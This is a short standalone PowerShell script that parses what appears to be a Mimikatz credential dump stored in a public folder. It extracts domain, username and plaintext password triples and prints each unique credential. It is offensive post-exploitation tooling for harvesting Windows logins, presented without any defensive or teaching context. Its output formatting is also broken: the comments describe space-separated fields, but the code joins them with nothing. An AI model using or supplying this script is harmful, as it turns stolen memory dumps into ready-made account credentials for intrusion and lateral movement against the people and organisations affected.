$username = ''
$domain = ''
$password = ''
$list = @()

foreach ($line in Get-Content C:\Users\Public\mimidump) {
    # find a username
    if($line.ToLower().Contains('username')){
        if(-not ($line.Contains('$') -or $line.Contains('(null)'))){
            $username = $line.split(':')[1]
        }
    }
    
    # find a Domain
    if($line.ToLower().Contains('domain')){
        if(-not ($line.Contains('(null)'))){
            $domain = $line.split(':')[1]
        }
    }
    
    # find a password
    if($line.ToLower().Contains('password')){
        # filter out null passwords
        if(-not ($line.Contains('(null)'))){
            # filter out bad results by making sure the password is less than 16 chars long
            if($line.split(':')[1].Length -lt 16){
                $password = $line.split(':')[1]
            }
        }
    }
    
    # if all 3 are set, then we have completed a tuple
    # add the tuple to the list in the form of
    # "<domain> <username> <password>"
    # (space separated)
    if($username -ne '' -and $domain -ne '' -and $password -ne ''){
        $list += "$($domain)$($username)$($password)"
        $username = ''
        $domain = ''
        $password = ''
    }
}

# print unique lines with whitespace trimmed
# replace internal spaces with colons
foreach($e in ($list | select -Unique)){
    $e.trim() -replace " ", ":"
}
    